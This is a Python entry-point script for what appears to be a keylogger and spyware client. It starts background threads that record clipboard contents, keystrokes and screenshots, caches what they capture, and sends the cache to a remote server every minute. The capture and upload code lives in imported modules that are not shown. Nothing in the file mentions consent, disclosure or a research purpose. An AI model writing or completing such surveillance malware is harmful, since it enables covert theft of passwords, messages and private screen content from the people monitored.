import sys
import os

# Add client directory to Python path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# Now import other modules
import threading
import time
from clipboard import start_clipboard_monitoring
from keystrokes import start_keystroke_monitoring
from screenshots import start_screenshot_monitoring
from utils import log
from sender import server_is_online, send_cached_data
from cache import ensure_cache_directory


def cache_sync_loop():
    """Periodically attempt to send cached data"""
    while True:
        time.sleep(60)  # Check every minute
        if server_is_online():
            send_cached_data()


def main():
    log("Client starting...")

    # Ensure cache directory exists
    ensure_cache_directory()

    # Start all monitoring modules in separate threads
    threading.Thread(target=start_clipboard_monitoring, daemon=True).start()
    threading.Thread(target=start_keystroke_monitoring, daemon=True).start()
    threading.Thread(target=start_screenshot_monitoring, daemon=True).start()

    # Start cache sync thread
    threading.Thread(target=cache_sync_loop, daemon=True).start()

    # Keep main thread alive
    try:
        while True:
            time.sleep(1)  # Sleep to reduce CPU usage
    except KeyboardInterrupt:
        log("Client shutting down...")


if __name__ == "__main__":
    main()
